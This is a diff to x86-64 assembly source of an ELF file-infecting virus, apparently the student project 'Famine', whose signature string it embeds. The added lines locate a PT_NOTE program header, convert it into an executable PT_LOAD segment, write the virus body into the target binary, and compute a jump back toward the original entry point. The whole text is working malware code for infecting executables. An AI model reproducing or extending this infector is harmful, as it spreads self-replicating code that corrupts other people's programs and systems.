@@ -225,6 +225,9 @@ infect_file:                          ; rdi = ptr nome file
 ; open
     mov rsi, 1026
     call open                         ; rax = fd
+    cmp rax, 0
+    jb exit
+    mov [rsp+36920], rax
 ; lseek
     push rax
     push rdi
@@ -241,7 +244,52 @@ infect_file:                          ; rdi = ptr nome file
     jb exit
     mov r10, rax                      ; r10 = ptr map
     pop rax
+; infect
+    mov rcx, [r10+ehdr.e_phoff]
+    add rcx, r10                      ; rcx = phdr
+    xor r12, r12
+    mov r12w, [r10+ehdr.e_phnum]      ; r12 = phnum
+    mov rax, -1
+    .loop:
+        inc rax
+        mov dl, [rcx+phdr.p_type]
+        cmp dl, 4                     ; p_type == PT_NOTE
+        je .finded
+        add rcx, 56
+        cmp rax, r12
+        jb .loop
+    .end:
 ; close
-    mov rdi, rax
+    mov rdi, [rsp+36920]
     call closefd
+; ret
     ret
+
+    .finded:                          ; rcx = ptr section PT_NOTE
+    mov dword [rcx+phdr.p_type], 1    ; PT_LOAD
+    mov dword [rcx+phdr.p_flags], 7   ; PF_R | PF_X | PF_W
+    lea r12, [rel end_offset]
+    lea rax, [rel _start]
+    sub r12, rax                      ; r12 = size payload
+    mov qword [rcx+phdr.p_offset], rsi; p_offset = size file
+    add rsi, 0xc000000                ; rsi = 0xc000000 + size file
+    mov qword [rcx+phdr.p_vaddr], rsi ; p_vaddr = rsi
+    add qword [rcx+phdr.p_filesz], r12; p_filesz += size payload
+    add qword [rcx+phdr.p_memsz], r12 ; p_memsz += size payload
+    xor rcx, rcx
+    mov ecx, dword [r10+ehdr.e_entry] ; ecx = e_entry
+    sub ecx, esi                      ; ecx -= p_vaddr
+    sub ecx, r12d                     ; ecx -= size payload
+    ; ecx = (uint32_t)offsetJump
+; write
+    mov rdi, [rsp+36920]
+    lea rsi, [rel _start]
+    mov rdx, r12
+    mov rax, 1
+    syscall
+    jmp .end
+
+firma:
+	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
+
+end_offset:
